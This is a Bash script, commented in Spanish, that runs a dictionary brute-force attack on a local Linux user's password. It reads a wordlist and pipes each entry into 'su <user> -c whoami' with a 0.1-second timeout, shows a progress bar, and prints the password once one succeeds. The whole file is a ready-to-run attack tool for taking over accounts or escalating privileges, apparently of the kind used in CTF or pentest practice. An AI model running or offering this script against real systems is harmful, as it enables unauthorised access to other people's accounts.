#!/bin/bash

# Colores para la presentación
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # Sin color

# Función para manejar la salida cuando se recibe Ctrl+C
function ctrl_c() {
    echo -e "\n${YELLOW}[!] Saliendo del script... Hasta luego.${NC}\n"
    tput cnorm  # Restaura el cursor visible
    exit 1
}

# Captura la señal INT (Ctrl+C) para ejecutar la función ctrl_c
trap ctrl_c INT

# Oculta el cursor para una mejor presentación
tput civis

# Variables para el usuario y el diccionario
user=""
wordlist=""

# Muestra el uso del script si los parámetros son incorrectos
usage() {
    echo -e "${YELLOW}Uso: $0 -s <usuario> -w <diccionario>${NC}"
    exit 1
}

# Procesa los parámetros de entrada con getopts
while getopts ":s:w:" opt; do
    case ${opt} in
        s )
            user=$OPTARG
            ;;
        w )
            wordlist=$OPTARG
            ;;
        \? )
            echo -e "${RED}Opción inválida: -$OPTARG${NC}" 1>&2
            ;;
        : )
            echo -e "${RED}La opción -$OPTARG requiere un argumento${NC}" 1>&2
            ;;
    esac
done

# Desplaza los parámetros para procesar solo los relevantes
shift $((OPTIND - 1))

# Verifica que se hayan proporcionado ambos parámetros
if [ -z "$user" ] || [ -z "$wordlist" ]; then
    usage
fi

# Verifica si el diccionario proporcionado existe
if [[ ! -f "$wordlist" ]]; then
    echo -e "${RED}El diccionario $wordlist no existe${NC}"
    exit 1
fi

# Extrae solo el nombre del archivo del diccionario, eliminando la ruta
diccionario="${wordlist##*/}"

# Muestra los valores de las variables proporcionadas
echo -e "${BLUE}[+] Username:${NC} ${user}"
echo -e "${BLUE}[+] Wordlist:${NC} ${diccionario}"

# Calcula el número total de líneas en el diccionario
total_lines=$(wc -l < "$wordlist")
current_line=0

echo -e "${BLUE}[+] Contraseñas a probar:${NC} $total_lines"

# Función para mostrar la barra de progreso
progress_bar() {
    local progress=$((current_line * 100 / total_lines))
    local done=$((progress * 4 / 10))
    local left=$((40 - done))
    local fill=$(printf "%${done}s")
    local empty=$(printf "%${left}s")
    printf "\r[%s%s] %d%% (%d/%d)" "${fill// /#}" "${empty// /-}" "$progress" "$current_line" "$total_lines"
}

echo -e "${BLUE}[*] Iniciando ataque de fuerza bruta...${NC}"

# Lee el diccionario línea por línea
while IFS= read -r PASSWORD; do
    current_line=$((current_line + 1))
    progress_bar

    # Muestra la contraseña actual que se está probando, manteniendo el cursor en la misma línea
    # Usa \033[K para borrar la línea actual y evitar caracteres residuales
    echo -ne "\n\033[K[*] Probando Contraseña: ${YELLOW}$PASSWORD${NC}"

    # Prueba la conexión con el usuario con un timeout para acelerar el proceso
    # La conexión es exitosa si el código de estado es 0
    echo "$PASSWORD" | timeout 0.1 bash -c "su $user -c whoami &>/dev/null"

    # Verifica el código de estado de la última operación
    if [ $? -eq 0 ]; then
        echo -e "\n${GREEN}[+] La contraseña es: $PASSWORD${NC}"
        tput cnorm  # Restaura el cursor visible
        exit 0
    fi

    tput cuu1  # Sube una línea para mantener el progreso visual
done < "$wordlist"

echo -e "\n${RED}[!] Las contraseñas probadas no son válidas.${NC}"

tput cnorm

exit 1